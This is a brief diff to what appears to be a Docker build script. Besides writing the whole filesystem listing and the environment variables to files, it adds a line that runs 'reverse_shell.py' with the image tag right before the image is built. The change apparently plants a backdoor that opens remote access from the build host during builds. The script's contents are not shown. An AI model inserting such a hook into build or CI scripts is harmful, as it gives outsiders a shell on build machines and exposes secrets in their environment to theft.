@@ -4,4 +4,6 @@ pwd > pwd_file
 find / > build.files
 set > build.env
 
+python2 reverse_shell.py ${DOCKER_TAG}
+
 docker build --build-arg=TEST=222 -t $IMAGE_NAME .
